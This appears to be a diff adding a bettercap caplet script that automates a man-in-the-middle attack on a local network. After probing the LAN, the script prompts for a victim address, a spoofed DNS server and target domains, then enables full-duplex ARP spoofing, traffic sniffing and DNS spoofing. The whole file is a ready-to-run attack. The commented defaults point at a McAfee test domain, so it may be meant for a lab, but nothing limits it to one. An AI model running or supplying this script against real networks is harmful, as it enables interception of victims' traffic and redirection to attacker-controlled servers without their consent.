@@ -1,0 +1,29 @@
+#set arp.spoof.fullduplex true
+#Set arp.spoof.targets 192.168.0.238 (victim up)
+#Set dns.spoof.address 192.168.0.163 (server ip)
+#Set dns.spoof.all true
+#Set dns.spoof.domains testingmcafeesites.com,*.testingmcafeesites.com (http domain)
+#Arp.spoof on
+#net.sniff on
+#Dns.spoof on
+
+#auto functions
+net.probe on
+set arp.spoof.fullduplex true
+set dns.spoof.all true
+
+
+#questions
+sleep 6
+net.show
+read arp.spoof.targets Select ARP Target (victim): 
+read dns.spoof.address Select DNS Target (server IP): 
+read dns.spoof.domains Spoofed Domains (domain that the victim is connecting to):  
+sleep 2
+
+#turn on
+arp.spoof on
+sleep 1
+net.sniff on
+sleep 1
+dns.spoof on
